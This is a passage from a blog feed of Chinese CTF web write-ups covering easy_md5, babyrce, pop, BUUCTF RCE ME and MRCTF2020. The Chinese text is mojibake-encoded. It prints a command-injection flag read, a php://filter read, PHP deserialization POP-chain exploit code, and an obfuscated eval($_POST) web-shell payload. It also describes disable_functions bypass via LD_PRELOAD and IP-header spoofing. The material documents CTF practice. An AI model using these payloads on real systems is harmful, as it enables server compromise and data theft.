href="#easy-md5" class="headerlink" title="easy_md5"></a>easy_md5</h3><p><img src="/2021/10/04/web/2/image-20211004110322862.png" alt="image-20211004110322862"></p><p>æ•°ç»„ç»•è¿‡å³å¯</p><p><img src="/2021/10/04/web/2/image-20211004110433124.png" alt="image-20211004110433124"></p><h3 id="easyupload1-0"><a href="#easyupload1-0" class="headerlink" title="easyupload1.0"></a>easyupload1.0</h3><p>æ”¹ç±»å‹ä¸Šä¼ phpï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„</p><h3 id="easyupload2-0"><a href="#easyupload2-0" class="headerlink" title="easyupload2.0"></a>easyupload2.0</h3><p>ä¸Šä¼ phtmlé©¬æ–‡ä»¶ç»•è¿‡ï¼Œèšå‰‘è¿ä¸Š</p><h3 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h3><p>åŸºç¡€é¢˜ï¼Œç›´æ¥æŸ¥æ•°æ®åº“ï¼ŒæŸ¥è¡¨ï¼Œæœ€åæŸ¥å­—å</p><h3 id="easyrce"><a href="#easyrce" class="headerlink" title="easyrce"></a>easyrce</h3><p>å‘½ä»¤æ‰§è¡Œæ¼æ´</p><p><a href="https://www.cnblogs.com/-qing-/p/10819069.html">https://www.cnblogs.com/-qing-/p/10819069.html</a></p><h3 id="babyrce"><a href="#babyrce" class="headerlink" title="babyrce"></a>babyrce</h3><p><img src="/2021/10/04/web/2/QQ%E5%9B%BE%E7%89%8720211004210427.png"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$9&#x2F;flllllaaaaaaggggggg</span><br></pre></td></tr></table></figure><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>ä¼ªåè®®è¯»å–</p><p>php://filter/read=convert.base64.encode/resource=flag.php</p><p><a href="https://segmentfault.com/a/1190000018991087">PHPä¼ªåè®®æ€»ç»“ - SegmentFault æ€å¦</a></p><h3 id="ez-unserialize"><a href="#ez-unserialize" class="headerlink" title="ez_unserialize"></a>ez_unserialize</h3><p><img src="/2021/10/04/web/2/image-20211004210242660.png" alt="image-20211004210242660"></p><p>è¿™é¢˜è™½ç„¶å¾ˆç®€å•ï¼Œè¢«æˆ‘å½“æ—¶ç§’è§£çš„åŸå› ç«Ÿç„¶æ˜¯è¯¯æ‰“è¯¯æ’ï¼ˆdogeï¼‰</p><p>æ‰“å¼€é¶æœºï¼Œå¯çˆ±çš„å°èƒ¡æ¡ƒ</p><p><img src="/2021/10/04/web/2/image-20211009205021612.png" alt="image-20211009205021612"></p><p>f12çœ‹ä¸‹</p><p><img src="/2021/10/04/web/2/image-20211009205055755.png" alt="image-20211009205055755"></p><p>æç¤ºå¾ˆæ˜æ˜¾äº†ï¼Œrobotsåè®®</p><p><img src="/2021/10/04/web/2/image-20211009205151043.png" alt="image-20211009205151043"></p><p>è®¿é—®ä¸€ä¸‹å°±æœ‰é¢˜ç›®æºç äº†ï¼š</p><p><img src="/2021/10/04/web/2/image-20211009205233533.png" alt="image-20211009205233533"></p><p>å¾ˆç®€å•çš„åºåˆ—åŒ–ï¼Œå”¯ä¸€è¦æ³¨æ„çš„ç‚¹æ˜¯ï¼Œæˆ‘ä»¬æƒ³è®©ç±» wllmçš„å±æ€§adminå’Œpasswdçš„å€¼ä¸ºadminå’Œctfï¼Œ</p><p>è€Œé­”æœ¯æ–¹æ³•æ„é€ å´ä¼šå¼ºè¿«è®©ä»–ä»¬å€¼å˜æˆuserå’Œ123456</p><p>æ‰€ä»¥æˆ‘ä»¬åºåˆ—åŒ–çš„æ—¶å€™ç›´æ¥åˆ å»å°±å¥½ï¼Œå°±ä¸ä¼šè§¦å‘äº†</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;cl45s.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wllm</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $admin = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> $passwd = <span class="string">&quot;ctf&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&quot;admin&quot;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd === <span class="string">&quot;ctf&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Just a bit more!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$p = <span class="keyword">new</span> wllm();</span><br><span class="line"><span class="keyword">echo</span>(serialize($p));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/web/2/image-20211009205525269.png" alt="image-20211009205525269"></p><h3 id="no-wakeup"><a href="#no-wakeup" class="headerlink" title="no_wakeup"></a>no_wakeup</h3><p><a href="https://www.cnblogs.com/Mrsm1th/p/6835592.html">phpååºåˆ—åŒ–æ¼æ´ç»•è¿‡é­”æœ¯æ–¹æ³• __wakeup - Mrsm1th - åšå®¢å›­ (cnblogs.com)</a></p><p><code>$_SERVER[&#39;QUERY_STRING&#39;]</code>ï¼Œä»–éªŒè¯çš„æ—¶å€™æ˜¯ä¸ä¼šè¿›è¡Œurlè§£ç çš„</p><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><p>æºä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> $admin = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">  <span class="keyword">protected</span> $passwd = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">      <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">      <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $w00m;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> $w00m;</span><br><span class="line">  <span class="keyword">public</span> $w22m;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$w00m = $_GET[<span class="string">&#x27;w00m&#x27;</span>];</span><br><span class="line">unserialize($w00m);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥åˆ†æåˆ†æ</p><p>æ€»å…±åˆ†ä¸ºäº†ä¸‰ä¸ªç±»å¯¹å§ï¼Œæœ€ç»ˆçš„ç›®çš„æ˜¯æƒ³è§¦å‘ç¬¬ä¸€ä¸ªç±»class w44mé‡Œçš„GetFlag()äº†</p><p>æˆ‘ä»¬è¦å……åˆ†åˆ©ç”¨è¿™ä¸‰ä¸ªç±»</p><p>payloadçš„éƒ¨åˆ†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$a = <span class="keyword">new</span> w22m();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> w33m();</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> w44m();</span><br><span class="line"></span><br><span class="line">$b -&gt; w00m = $c;</span><br><span class="line"></span><br><span class="line">$b -&gt; w22m = <span class="string">&quot;GetFlag&quot;</span>;</span><br><span class="line"></span><br><span class="line">$a -&gt; w00m = $b;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><p>é¦–å…ˆä»»å–ä¸‰ä¸ªå˜é‡ï¼Œæ¯”å¦‚æˆ‘è¿™é‡Œå–äº†aï¼Œbï¼Œc</p><p>åˆ†åˆ«èµ‹å€¼æ–°çš„ä¸‰ä¸ªç±»</p><p>è®©å˜é‡bé‡Œçš„å±æ€§w00mèµ‹å€¼ä¸ºw44mï¼Œä¹Ÿå°±æ˜¯æ»¡è¶³</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($this-&gt;admin &#x3D;&#x3D;&#x3D; &#39;w44m&#39; &amp;&amp; $this-&gt;passwd &#x3D;&#x3D;&#x3D;&#39;08067&#39;)</span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ä¸ªå±æ€§w22mèµ‹å€¼â€œGetFlagâ€ï¼Œå®Œæˆè°ƒç”¨å‡½æ•°çš„æ­¥éª¤</p><p>åˆ©ç”¨äº†è¿™å¥**$this-&gt;w00m-&gt;{$this-&gt;w22m}**ï¼Œè¿™æ ·å°±å®ç°w44m -&gt; GetFlag()</p><p>ä¹‹åè®©å˜é‡aé‡Œçš„å±æ€§w00mèµ‹å€¼b</p><p>éšä¹‹ä¼šè§¦å‘ææ„å‡½æ•°_destruct</p><p>æœ€åçš„urlencodeæ˜¯å› ä¸ºé¢˜ç›®é‡Œçš„è·å–å‚æ•°å€¼æ˜¯getè·å–ï¼Œä¼šç»è¿‡æµè§ˆå™¨çš„urlè§£æã€‚</p><p>å®Œæ•´payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $admin = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> $passwd = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="keyword">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;admin;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;passwd;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nono&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $w00m;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $w00m;</span><br><span class="line">    <span class="keyword">public</span> $w22m;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> w22m();</span><br><span class="line">$b = <span class="keyword">new</span> w33m();</span><br><span class="line">$c = <span class="keyword">new</span> w44m();</span><br><span class="line">$b -&gt; w00m = $c;</span><br><span class="line">$b -&gt; w22m = <span class="string">&quot;GetFlag&quot;</span>;</span><br><span class="line">$a -&gt; w00m = $b;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/10/04/web/2/image-20211009203101560.png" alt="image-20211009203101560"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å‚ä¸äº†ä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;æ–°ç”Ÿèµ›ï¼Œå‘ç°åŸºç¡€è¿˜ä¸å¤Ÿæ‰å®&lt;/p&gt;
&lt;p&gt;é¡ºä¾¿è®°å½•ä¸€ä¸‹è§£é¢˜&lt;/p&gt;
&lt;h3 id=&quot;gift-F12&quot;&gt;&lt;a href=&quot;#gift-F12&quot; class=&quot;headerlink&quot; title=&quot;gift_F12&quot;&gt;&lt;/a&gt;gift_F12&lt;/h3</summary>
      
    
    
    
    
    <category term="web" scheme="http://daweitech.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>æå®¢å¤§æŒ‘æˆ˜ 2019 RCE ME</title>
    <link href="http://daweitech.github.io/2021/09/29/buu/25/"/>
    <id>http://daweitech.github.io/2021/09/29/buu/25/</id>
    <published>2021-09-29T13:28:21.000Z</published>
    <updated>2021-09-29T13:54:19.423Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/09/29/buu/25/image-20210929213110592.png" alt="image-20210929213110592"></p><p>GETä¼ å‚</p><p>strlenï¼šé•¿åº¦ä¸è¶…è¿‡40</p><p>preg_matchï¼šåŒ¹é…è‹±æ–‡å­—æ¯å’Œæ•°å­—ï¼Œdie NO</p><p>æ»¡è¶³æ¡ä»¶å°±å½“åšphpæ‰§è¡Œå¹¶ä¸”ä¸æŠ¥é”™</p><p>[<a href="https://www.cnblogs.com/yunqian2017/p/13308599.html">æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME - äº‘åƒ - åšå®¢å›­ (cnblogs.com)</a></p><p>å‚è€ƒï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¯ä»¥ç”¨å¼‚æˆ–æˆ–è€…å–åç»•è¿‡</span><br><span class="line">å¼‚æˆ–ç»•è¿‡æ˜¯æŒ‡ä½¿ç”¨å„ç§ç‰¹æ®Šå­—ç¬¦çš„å¼‚æˆ–æ„é€ å‡ºå­—æ¯å’Œæ•°å­—ã€‚å–åç»•è¿‡æ˜¯å¯¹è¯­å¥å–åã€‚</span><br></pre></td></tr></table></figure><p>ç”ŸæˆæŸ¥è¯¢PHP info çš„payloadä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> urlencode(~<span class="string">&#x27;phpinfo&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å³ï¼Œå¯¹æŸ¥è¯¢è¯­å¥å–åï¼Œç„¶åç¼–ç ã€‚åœ¨ç¼–ç å‰åŠ ä¸Š~è¿›è¡Œå–åï¼Œæ‹¬å·æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œä¸ç”¨å–åã€‚</p><p>æ„é€ å®Œçš„è¯­å¥è¿›è¡ŒæŸ¥è¯¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p><img src="/2021/09/29/buu/25/image-20210929213713432.png" alt="image-20210929213713432"></p><p>çœ‹ä¸€äº›ä¿¡æ¯:</p><p><img src="/2021/09/29/buu/25/image-20210929213849813.png" alt="image-20210929213849813"></p><p>ç¦ç”¨çš„å‡½æ•°ç›¸å½“çš„å¤š</p><p>å…ˆä¼ æœ¨é©¬è¿æ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$a=<span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">$b=urlencode(~$a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">$c=<span class="string">&#x27;(eval($_POST[mochu7]))&#x27;</span>;</span><br><span class="line">$d=urlencode(~$c);</span><br><span class="line"><span class="keyword">echo</span> $d;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%92%90%9C%97%8A%C8%A2%D6%D6); </span><br></pre></td></tr></table></figure><p><img src="/2021/09/29/buu/25/image-20210929214111148.png" alt="image-20210929214111148"></p><p>è¿ä¸Šä¹‹åå‘ç°æƒé™è¿‡ä½</p><p><img src="/2021/09/29/buu/25/image-20210929214319688.png" alt="image-20210929214319688"></p><p>è¦è¯»å–flagï¼Œéœ€è¦å…ˆæ‰§è¡Œreadflag,ä½†æ˜¯å› ä¸ºç¦ç”¨äº†å¾ˆå¤šå‡½æ•°ï¼Œæ²¡æœ‰åŠæ³•æ‰§è¡Œå‘½ä»¤ï¼Œè¿™æ—¶å€™éœ€è¦ç»•è¿‡disable_functions.æ–¹æ³•å¥½åƒå¾ˆå¤šï¼Œæœ‰çš„ç”¨èšå‰‘çš„æ’ä»¶ï¼Œæœ‰çš„åŠ«æŒå…±äº«soï¼Œä¹Ÿæœ‰ä¸€äº›å·¥å…·<br>1.è¿™é‡Œç”¨å·¥å…·<br>åœ°å€<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>ç”±äºåœ¨/var/tmpç›®å½• æœ‰ä¸Šä¼ æƒé™ï¼Œå¯ä»¥ä¸Šä¼ bypass_disablefun_x64.soå’Œbypass_disablefunc.phpï¼ˆé‡å‘½åä¸ºshell.phpï¼‰ï¼Œ</p><p>2.èšå‰‘æ’ä»¶ç›´æ¥ç»•è¿‡</p><p><img src="/2021/09/29/buu/25/image-20210929214454384.png" alt="image-20210929214454384"></p><p><img src="/2021/09/29/buu/25/image-20210929214557378.png" alt="image-20210929214557378"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/09/29/buu/25/image-20210929213110592.png&quot; alt=&quot;image-20210929213110592&quot;&gt;&lt;/p&gt;
&lt;p&gt;GETä¼ å‚&lt;/p&gt;
&lt;p&gt;strlenï¼šé•¿åº¦ä¸è¶…è¿‡40&lt;/p&gt;
&lt;p&gt;preg_m</summary>
      
    
    
    
    
    <category term="buu" scheme="http://daweitech.github.io/tags/buu/"/>
    
  </entry>
  
  <entry>
    <title>MRCTF2020 wirteup</title>
    <link href="http://daweitech.github.io/2021/09/28/buu/24/"/>
    <id>http://daweitech.github.io/2021/09/28/buu/24/</id>
    <published>2021-09-28T11:31:00.000Z</published>
    <updated>2021-09-29T08:44:19.842Z</updated>
    
    <content type="html"><![CDATA[<p>â€‹    å‚è€ƒäº†Y1ngå¤§ä½¬çš„åšå®¢ï¼š<a href="https://www.gem-love.com/ctf/2184.html">https://www.gem-love.com/ctf/2184.html</a></p><p>çœŸçš„å†™å¾—å¾ˆæ£’ï¼Œçœ‹ç€ååˆ†èˆ’æœï¼Œè¿˜åœ¨è¯„è®ºåŒºæå‡ºä¸€ç‚¹å°å»ºè®®ï¼ˆå¸Œæœ›ä¸ä¼šè¢«å¸ˆå‚…å˜²ç¬‘ï¼‰</p><h2 id="å¥—å¨ƒ"><a href="#å¥—å¨ƒ" class="headerlink" title="å¥—å¨ƒ"></a>å¥—å¨ƒ</h2><p>è¿™é¢˜éš¾åº¦ä¸å¤§ï¼Œæˆ‘å¡åœ¨äº†ç¼–å†™è„šæœ¬ä¸Š</p><p><img src="/2021/09/28/buu/24/image-20210928193418732.png" alt="image-20210928193418732"></p><p>å¸¸è§„æºç æŸ¥çœ‹</p><p><img src="/2021/09/28/buu/24/image-20210928193507092.png" alt="image-20210928193507092"></p><p>è¿™é‡Œçš„ç»•è¿‡å’ŒBJDCTFçš„Ezphpä¸€æ®µä»£ç ç±»ä¼¼ï¼Œæœ¬æ¥ä»¥ä¸ºä¹Ÿå¯ä»¥urlç¼–ç ç»•è¿‡</p><p>ç»“æœä¸Šé¢å‡ºç°äº†è®¡æ•°ï¼š%5fä¸èƒ½å‡ºç°ï¼Œå› ä¸º_ç¼–ç åå°±æ˜¯%5f,æ‰€ä»¥å°±è¦æ±‚å…¶ä»–æ–¹æ³•ç»•è¿‡äº†</p><p>_ ç”¨ â€˜  â€™ ç»•è¿‡ï¼Œè€Œåé¢çš„æ­£åˆ™åŒ¹é…è¡¨ç¤ºåŒ¹é…å­—ç¬¦ä¸²çš„å¼€å¤´å’Œç»“å°¾</p><p>åœ¨å­—ç¬¦ä¸²ä¸­æ¢è¡Œå¯ä»¥è¡¨ç¤ºå­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œæ‰€ä»¥å¯ä»¥ç”¨%0aï¼ˆæ¢è¡Œç¬¦çš„urlç¼–ç ï¼‰ç»•è¿‡</p><p>æ‰€ä»¥payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b u p t&#x3D;23333%0a</span><br></pre></td></tr></table></figure><p><img src="/2021/09/28/buu/24/image-20210928194036030.png" alt="image-20210928194036030"></p><p>å¾—åˆ°æç¤º</p><p>å»è®¿é—®secrettw.phpé¡µé¢</p><p><img src="/2021/09/28/buu/24/image-20210928194130440.png" alt="image-20210928194130440"></p><p>whoaï¼Œè¢«æŒ¡äº†</p><p>æ·»åŠ Client-ipï¼š127.0.0.1</p><p><img src="/2021/09/28/buu/24/image-20210928194319439.png" alt="image-20210928194319439"></p><p>å†æ¬¡æŸ¥çœ‹æºç ï¼š</p><p><img src="/2021/09/28/buu/24/image-20210928194351650.png" alt="image-20210928194351650"></p><h4 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h4><p>åŸæ¥æ˜¯å’Œjsæœ‰å…³çš„ä»£ç ï¼Œ</p><p><img src="/2021/09/28/buu/24/image-20210928194516235.png" alt="image-20210928194516235"></p><p>æç¤ºæˆ‘ä»¬posyä¼ å‚Merak</p><p>ä»»æ„èµ‹å€¼ï¼šMerak=1</p><p><img src="/2021/09/28/buu/24/image-20210928194610158.png" alt="image-20210928194610158"></p><p>å¥½äº†ï¼Œæºç å‡ºæ¥äº†</p><p>ä»£ç åˆ†æï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function change($v)&#123; </span><br><span class="line">  $v &#x3D; base64_decode($v); </span><br><span class="line">  $re &#x3D; &#39;&#39;; </span><br><span class="line">  for($i&#x3D;0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">    $re .&#x3D; chr ( ord ($v[$i]) + $i*2 ); </span><br><span class="line">  &#125; </span><br><span class="line">  return $re; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥å†™ä¸€ä¸ªé€†å‘çš„è„šæœ¬æ¥æ»¡è¶³è¦æ±‚ï¼š</p><h4 id="é€†æ–¹å‘è„šæœ¬"><a href="#é€†æ–¹å‘è„šæœ¬" class="headerlink" 